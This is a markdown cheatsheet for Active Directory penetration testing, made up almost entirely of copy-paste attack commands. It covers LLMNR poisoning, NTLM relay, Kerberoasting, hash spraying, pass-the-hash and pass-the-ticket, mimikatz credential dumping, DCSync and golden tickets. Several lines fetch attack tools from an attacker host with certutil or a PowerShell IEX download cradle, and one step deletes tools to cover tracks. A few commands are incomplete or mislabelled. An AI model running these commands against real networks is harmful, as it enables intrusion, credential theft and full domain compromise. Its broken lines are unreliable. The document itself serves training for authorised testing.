# Active Directory Pentest Cheatsheet

## ⚠️ Disclaimer:  
This repository is intended for educational and ethical penetration testing purposes only.  
Any use of the information available in this repository for attacking targets without prior mutual consent is `ILLEGAL!`.  
The author(s) is/are not responsible for any misuse of this content.

### Assume Variables
Let's assume that the Domain Controller IP is `10.10.10.1/24` and we managed to capture one of the domain users from LLMNR poisoning is `fcastle`

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Vulnerability Scanning (Nessus & Metasploit)](#vulnerability-scanning-nessus--metasploit)
3. [LLMNR Poisoning](#llmnr-poisoning)
4. [IPv6 Attacks](#ipv6-attacks)
5. [SMB Relay Attack](#smb-relay-attack)
6. [BloodHound Domain Enumeration](#bloodhound-domain-enumeration)
7. [PlumHound Domain Enumeration (Optional)](#plumhound-domain-enumeration-optional)
8. [LdapDomainDump Enumeration (Optional)](#ldapdomaindump-enumeration-optional)
9. [Kerberoasting](#kerberoasting)
10. [Password/Hash Spraying](#passwordhash-spraying)
11. [SMB Enumeration](#smb-enumeration)
12. [Pass the Password/Pass the Hash](#pass-the-password-pass-the-hash)
13. [Local Privilege Escalation](#local-privilege-escalation)
14. [Credential Dumping](#credential-dumping)
15. [Rubeus Kerberos Attacks](#rubeus-kerberos-attacks)
16. [Alternative Access to Compromised Machine using RDP](#alternative-access-to-compromised-machine-using-rdp)
17. [Lateral Movement](#lateral-movement)
18. [Domain Privilege Escalation](#domain-privilege-escalation)
19. [Post-Pwning Domain Controller](#post-pwning-domain-controller)
20. [Useful Metasploit Modules for Post Windows Exploitations](#useful-metasploit-modules-for-post-windows-exploitations)
21. [References](#references)
22. [Final Notes](#final-notes)

---

## Reconnaissance
### 1. If we have access to the internal network on premise try using an ARP sweep
```sh
netdiscover -r 10.10.10.0/24
```
### 2. If we are accessing the internal network using a VPN use nmap instead
 I usually do this scan as it scans the services and the versions of each open ports, but it could take longer than a regular SYN scan. So try doing something else while it's running.
```sh
nmap -T4 -p- -sC -sV 10.10.10.0/24
```

### 3. If we found a port serving a website and is redirecting us to a domain we can use the following command to add the domain
```sh
sudo nano /etc/hosts

#E.G 10.10.10.1 test.local
<TARGET_IP> <SLD.TLD> 
```

### 4. If we found a HTTP port serving a website we can use the following commands to enumerate
```sh
#Enumerate directories
gobuster dir -u http://test.local -w /SecLists/Discovery/Web-Content/raft-small-directories.txt

#Enumerate subdomains
gobuster vhost -k -u http://test.local -w /SecLists/Discovery/DNS/subdomains-top1million.txt
```

---

## Vulnerability Scanning (Nessus & Metasploit)
### 1. Scanning with Nessus
#### Install & Start Nessus
```sh
sudo systemctl start nessusd
sudo systemctl enable nessusd
```
#### Access Nessus Web Interface
- Open browser and go to: `https://localhost:8834`
- Login and configure scan settings
- Pick Web Application Testing
- Run a scan on the target IP or subnet

### 2. Scanning with Metasploit's WMAP
#### Start Metasploit Console
```sh
sudo service postgresql start && msfconsole
```
#### Load WMAP Plugin
```sh
load wmap
```
#### Add Target
```sh
wmap_sites -a http://<TARGET_IP>
```
#### Scan the Target
```sh
wmap_run -t
```
#### View Results
```sh
wmap_vulns -l
```

---


## LLMNR Poisoning
### 1. Check if LLMNR/NBT-NS is enabled
```sh
nmap --script=llmnr,nbtns 10.10.10.0/24
```

### 2. Start Responder to capture NTLMv2 hashes
```sh
sudo responder -I tun0 -dP
```

### 3. If NTLMv2 hash was captured, crack it with Hashcat
```sh
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## IPv6 Attacks
### 1. Check if IPv6 is enabled on the network
```sh
ipconfig /all | findstr "IPv6"
```

### 2. Run mitm6 against the domain
```sh
sudo mitm6 -d test.local
```

### 3. Start ntlmrelayx.py
```sh
# Try using LDAPS first, fallback to LDAP if necessary
ntlmrelayx.py -6 -t ldaps://10.10.10.1 -wh fakewpad.test.local -l lootme
ntlmrelayx.py -6 -t ldap://10.10.10.1 -wh fakewpad.test.local -l lootme
```

---

## SMB Relay Attack
### 1. Check if SMB signing is disabled
```sh
nmap -p445 10.10.10.0/24 --script=smb2-security-mode
```

### 2. Modify Responder configuration
```sh
sudo nano /etc/responder/Responder.conf
# Set the following:
SMB = Off
HTTP = Off
```

### 3. Start Responder
```sh
sudo responder -I tun0 -dP
```

### 4. Setup relays
```sh
# Dump password hashes
sudo ntlmrelayx.py -tf targets.txt -smb2support

# Create an interactive shell
sudo ntlmrelayx.py -tf targets.txt -smb2support -i

# Run a command
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

## BloodHound Domain Enumeration
### 1. Run BloodHound enumeration
```sh
sudo bloodhound-python -d [DOMAIN] -u [USERNAME] -p [USER-PW] -ns [DC-IP] -c all
```

### 2. Start Neo4j & BloodHound GUI
```sh
sudo neo4j start
sudo bloodhound
```

### 3. Look for privileged users
- Users with `DCSYNC` or `ALLRIGHTS` permissions
- Follow thick-to-thin edge hierarchy for privilege escalation paths

---

## PlumHound Domain Enumeration (Optional)
### 1. Start Neo4j & BloodHound
```sh
sudo neo4j start
sudo bloodhound
```

### 2. Run PlumHound (after BloodHound setup)
```sh
git clone https://github.com/PlumHound/PlumHound.git
cd PlumHound/
sudo python3 plumhound.py --easy -p fcastle-Password1
sudo python3 plumhound.py -x tasks/default.tasks -p fcastle-Password1
```

---

## LdapDomainDump Enumeration (Optional)

```sh
sudo ldapdomaindump ldaps://10.10.10.1 -u 'test.local\fcastle\' -p Password1
```
If the command above doesnt work due to some error about SSL error or handshake error try the command below
```sh
sudo ldapdomaindump ldap://10.10.10.1 -u 'test.local\fcastle\' -p Password1
```

## Kerberoasting
### 1. Enumerate Kerberos users (if no creds)
```sh
kerbrute userenum -d test.local --dc 10.10.10.1 userlist.txt -o kerb-results.txt
```

### 2. Get user SPNs (if domain creds available)
```sh
python GetUserSPNs.py test.local/fcastle:Password1 -dc-ip 10.10.10.1 -request
```

### 3. Crack the Kerberos hash
```sh
hashcat -m 13100 SPNs-hash.txt /usr/share/wordlists/rockyou.txt
```
---

## Password/Hash Spraying
This step is crucial as it will save a lot of your time in your pentest engagements

### 1. Spray passwords over SMB
```sh
crackmapexec smb 10.10.10.0/24 -d test.local -u fcastle -p Password1
```

### 2. Spray hashes(if we have them) instead of passwords
```sh
crackmapexec smb 10.10.10.0/24 -d test.local -u administrator -H [HASH]
```
---

## SMB Enumeration
### 1. List available SMB shares
```sh
smbclient -L <TARGET_IP> -U test.local/fcastle%Password1
```

### 2. Check accessible shares
```sh
smbmap -u fcastle -p Password1 -d . -H <TARGET_IP>
```

### 3. Download all files from an SMB share
```sh
smbclient \\\\<TARGET_IP>\\SHARE -U fcastle
recurse on
prompt off
mget *
```

### 4. Search for GPP cPasswords in NETLOGON/SYSVOL
```sh
sudo service postgresql start && msfconsole
use auxiliary/smb_enum_gpp
set RHOSTS <DC_IP>
set 
gpp-decrypt <PASSWORD>

```

---

## Pass the Password / Pass the Hash
If we have credentials that have local admin privileges on one of the machines, we can dump hashes and secrets available on the compromised machine

### Pass the Password using secretsdump.py
```sh
secretsdump.py test.local\fcastle:Password1@<TARGET_IP>
```
### Pass the Hash using secretsdump.py
```sh
secretsdump.py administrator@<TARGET_IP> --hashes [NT-HASH]
```
### Pass the Password using Metasploit
```sh
use windows/smb/psexec
set SMBDomain test.local
set SMBUser fcastle
set SMBPass Password1
set RHOSTS <TARGET_IP>
run
```

### PSExec
```sh
# for domain users
psexec.py test.local/fcastle:'Password1'@10.10.10.1

# for local users
psexec.py fcastle:'Password1'@10.10.10.1

#pass the hash for local users
psexec.py Administrator@10.10.10.1 -hashes [NTLM-hash]
```

### Wmiexec
```sh
wmiexec.py Administrator@10.10.10.1 -hashes [NTLM-hash]
```

### SMBExec
```sh
smbexec.py test.local/fcastle:'Password1'@10.10.10.1

smbexec.py test.local/fcastle@10.10.10.1 -hashes [NTLM-hash]
```

### Evil-WinRM
```sh
evil-winrm -i 10.10.10.1 -u fcastle -p 'Password1'


evil-winrm -i 10.10.10.1 -u fcastle -H [NTLM-hash]
```

---

## Local Privilege Escalation

### After getting a meterpreter shell, try the following command to see who we are in the machine
```sh
getuid

#Also run this following command to see the architecture of the host machine! We will assume that this returns a Windows X64 architecture!
getsystem
```
### If it returns `NT AUTHORITY` we can run anything in that machine without doing anything
You can run the command below to see all hashes stored in the machine
```sh
hashdump
```
### But if we are a user other `NT AUTHORITY` than we may or may not be able to do a hashdump, thus we need to check for token impersonations 

In this case, we will be using a module from Metasploit called `Incognito` which will allow us to impersonate as other users in that machine! but be sure to use `getprivs` to see if your account is allowed to impersonate as other users!
```sh
getprivs
```
If we see something like ImpersonateTokenPrivilege we may continue to the commands below
```sh
load incognito
list_tokens -u
```
If we see anything under the Delegation Tokens Available header we can impersonate that user!
```sh
impersonate_token "NT AUTHORITY"
```

### What to do if I don't have any privileges?
No worries, we can enumerate the local machine using `Winpeas.exe` and `Powerview.ps1`

#### Using WinPEAS for Privilege Escalation Enumeration
Download `WinPEAS.exe` and execute it to look for misconfigurations and privilege escalation vectors. There could be clear text credentials or encoded passwords in files such as `Groups.xml` or if the system was installed using an unattended installation winpeas will refer we to something like `Unattend.xml`
```sh
winpeas.exe > output.txt
```

#### Using PowerView for Enumeration
Load PowerView and use it to gather information about the system and domain.
```sh
powershell -ep bypass -File .\PowerView.ps1
Get-NetLocalGroupMember -Group "Administrators"
Get-NetUser # Lists domain users.
Get-NetGroupMember # Lists group members.
Find-LocalAdminAccess # Finds where a user has admin access.
Invoke-ShareFinder # Locates shared network resources.
```

---

## Credential Dumping

### Dumping Hashes from LSASS
Your compromised machine most likely dont have `mimikatz.exe` installed because it's not normal for users to have malware in their machine right? Let's try uploading mimikatz to the machine we compromised.

If we havent get `mimikatz` in your Attacker machine yet, we can try going to `@gentilkiwi` mimikatz repository, or we can copy the following link
```sh
https://github.com/gentilkiwi/mimikatz
```
After going to the repo, go to releases and download any compressed file to your liking, in this case we'll be using a `.zip` instead. So click on the file `mimikatz_trunk.zip` and extract it to a directory

```sh
unzip mimikatz_trunk.zip -d mimikatz_trunk
```
After unziping our mimikatz file, we need to run an HTTP server to be able to upload our files to the compromised machine, we will go to the x64 directory as we have information that the machine we compromised is running an X64 architecture!
```sh
cd mimikatz_trunk/x64/
ls 
```
we should be looking at files such as
```sh
mimidrv.sys  mimikatz.exe  mimilib.dll  mimispool.dll
```
We will be needing these files for our credential dumpings! so let's run our HTTP Server with either the following commands
```sh
python -m SimpleHTTPServer 8000

#Or if we are running python3 use the command below
python3 -m http.server 8000
```
If we see the prompt like `serving http server at port 8000` we are ready to download the files, go to the compromised machine and write
```
certutil -urlcache -f http://<ATTACKER_IP>:8000/mimidrv.sys
certutil -urlcache -f http://<ATTACKER_IP>:8000/mimikatz.exe
certutil -urlcache -f http://<ATTACKER_IP>:8000/mimilib.dll
certutil -urlcache -f http://<ATTACKER_IP>:8000/mimispool.dll
```

```sh
mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
```

### Dumping Hashes from SAM

```sh
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

### Dumping Hashes using PowerShell

```sh
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip>/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'"
```

---

## Rubeus Kerberos Attacks
`Rubeus.exe` is a powerful tool for manipulating Kerberos tickets, performing attacks like Pass-the-Ticket (PTT), Overpass-the-Hash, Kerberoasting, and more.

### 1. Uploading Rubeus.exe to the target machine
Just like the step for `mimikatz.exe` we will be utilizing python simple http server to upload Rubeus to our compromised machine 

1. Download Rubeus from `@GhostPack` Rubeus repository, or by copying the following line
```sh
git clone https://github.com/GhostPack/Rubeus.git
```
Then we will start our http server to upload rubeus to our compromised machine
```sh
cd /path/to/Rubeus/
python3 -m http.server 8000
```
And on the compromised machine open up cmd and fetch `Rubeus.exe` using the following command
```sh
certutil -urlcache -f http://<ATTACKER_IP>:8000/Rubeus.exe Rubeus.exe
```

### 2. Attack Kerberos using Rubeus

If we're already running as a user with Administrator privileges, run `Rubeus.exe` using the following command to dump all available tickets stored in memory
```ps1
Rubeus.exe
```
If we obtained a `.kirbi` kerberos ticket, we can inject the ticket to the memory by using the following command
```ps1
Rubeus.exe ptt /ticket:<BASE64_TICKET>
```
Or we could load multiple tickets from a directory by using the following command
```ps1
Rubeus.exe ptt /ticket:C:\Users\Public\admin_ticket.kirbi
```

### 3. Request a TGT via Overpass-the-Hash
if we have an NTLM hash of a user, we can request a TGT without needing their clear text password:
```ps1
Rubeus.exe asktgt /user:Administrator /rc4:<NTLM_HASH> /domain:test.local
```
Once we obtain the TGT, we can inject it into memory using
```
Rubeus.exe ptt /ticket:TGT.kirbi
```

### 4. Kerberoasting
We can extract service account hashes for offline cracking using `Rubeus.exe` using the command below
```ps1
Rubeus.exe kerberoast
```
And we will crack the hash we obtained using hashcat with the following command
```ps1
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

### 5. Obtain AES Keys (Privileged Access)
We can extract AES keys for further authentication attacks using `Rubeus.exe` using the following
```ps1
Rubeus.exe tgtdeleg
```

### 6. Clean Up (Optional)
After using Rubeus, we can cover up our tracks by deleting `Rubeus.exe`
```ps1
del Rubeus.exe
```

---

## Alternative Access to Compromised Machine using RDP
If we have local Administrator access to a machine we can enable `RDP` for GUI access if it was disabled prior to compromise, using the Metasploit module `post/windows/manage/enable_rdp`, we will assume we already have a meterpreter shell with Administrator privileges

```sh
msfconsole
use post/windows/manage/enable_rdp
sessions
set session <sessionsid>
run
```
On another terminal window we will run the following command to get GUI RDP access to our compromised machine
```sh
xfreerdp /u:administrator /p:Password1 /d:test.local /v:<TARGET_IP>
```

---

## Lateral Movement

### Using Pass-the-Ticket with Mimikatz on the compromised machine

```ps1
mimikatz "privilege::debug" "kerberos::ptc <TICKET_FILE>" "misc::cmd"
```

### Using Pass-the-Hash with PsExec

```sh
impacket-psexec test.local/Administrator@10.10.10.2 -hashes <LMHASH>:<NTHASH>
```

### Using WMI for Remote Execution

```sh
wmic /node:"10.10.10.2" /user:"test.local\fcastle" /password:"Password1" process call create "cmd.exe /c whoami"
```

---

## Domain Privilege Escalation

### DCSync Attack (Requires Replication Permissions)

```ps1
mimikatz "privilege::debug" "lsadump::dcsync /domain:test.local /user:Administrator"
```

### Extracting Credentials from Group Policy Preferences

```ps1
findstr /S cpassword \"\\<TARGET_IP>\\SYSVOL\\test.local\\Policies\"
```

### Abusing Unconstrained Delegation

```ps1
impacket-getST -spn cifs/10.10.10.2 test.local/fcastle:Password1 -dc-ip 10.10.10.1
impacket-psexec test.local/Administrator@10.10.10.2 -k -no-pass
```

---

## Post-Pwning Domain Controller
We can try doing a golden ticket attack to get more access to the whole domain by using mimikatz on the domain controller
```ps1
mimikatz.exe

privilege::debug

# dump the krbtgt user hash
lsadump::lsa /inject /name:krbtgt

kerberos::golden /User:Administrator /domain:test.local /sid:[DOMAIN_SID] /krbtgt:[KRBTGT_NTLM_HASH] /id:500 /ptt

# next we want the golden ticket cmd
misc::cmd

# now check our privileges, with accessing another machine
dir \\machine-01\c$
```

## Useful Metasploit Modules for Post Windows Exploitations
```sh
# Meterpreter
sysinfo
getuid
getsystem
getuid
getprivs
hashdump
show_mount
ps
migrate

# msfconsole
use post/windows/manage/migrate
use post/windows/gather/win_privs
use post/windows/gather/enum_logged_on_users
use post/windows/gather/checkvm
use post/windows/gather/enum_applications
use post/windows/gather/enum_av_excluded
use post/windows/gather/enum_computers
use post/windows/gather/enum_patches
use post/windows/gather/enum_shares
use post/windows/manage/enable_rdp
set SESSION <id>

loot
```
---
## References
https://blog.syselement.com/ine/courses/ejpt/ejpt-cheatsheet
https://www.offsec.com/metasploit-unleashed/fun-incognito/
https://github.com/GhostPack/Rubeus/
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993


## Final Notes
- **Always verify attack prerequisites** (e.g., SMB signing, LLMNR/NBT-NS status)
- **Check for privilege escalation paths** in BloodHound
- **Monitor logs for detection & evasion techniques**

**Stay Ethical and Hope you enjoyed this simple cheatsheet!**
